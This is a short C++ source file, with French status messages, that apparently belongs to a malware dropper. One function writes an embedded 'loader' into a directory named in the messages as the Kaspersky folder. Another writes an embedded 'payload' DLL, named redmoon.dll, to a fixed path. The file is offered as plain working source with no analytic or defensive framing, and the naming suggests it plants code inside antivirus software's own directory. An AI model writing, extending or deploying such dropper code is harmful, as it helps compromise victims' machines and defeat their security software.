#include "common.h"

namespace saryx {

bool install_modules(const std::wstring& kas_dir)
{
    if (!make_dir(kas_dir)) {
        ui::bad("dossier Kaspersky inaccessible.");
        return false;
    }
    const std::wstring loader = kas_dir + L"\\" + kLoaderName;
    if (!write_file(loader, kEmbeddedLoader, kEmbeddedLoaderSize)) {
        ui::bad("ecriture du loader impossible (erreur " +
                std::to_string(GetLastError()) + ").");
        return false;
    }
    return true;
}

bool write_payload()
{
    DeleteFileW(kPayloadPath);
    if (kEmbeddedPayloadSize == 0) {
        ui::warn("payload non embarque : redmoon.dll laisse vide.");
        return write_file(kPayloadPath, "", 0);
    }
    if (!write_file(kPayloadPath, kEmbeddedPayload, kEmbeddedPayloadSize)) {
        ui::bad("ecriture du payload impossible (erreur " +
                std::to_string(GetLastError()) + ").");
        return false;
    }
    return true;
}

} // namespace saryx